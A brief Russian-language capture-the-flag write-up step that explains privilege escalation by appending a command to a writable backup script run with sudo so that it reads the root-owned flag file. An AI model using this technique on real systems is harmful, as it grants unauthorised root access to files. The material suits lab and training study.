находим  скрипт Backup.sh который можем запустить от пользователя sudo и можем перезаписать скрипт 
```
#!/bin/bash
tar -czf /backup/backup.tar.gz /home/user/
```
добавим в скрипт echo "cat /root/flag" >> /usr/local/bin/backup.sh  и забираем флаг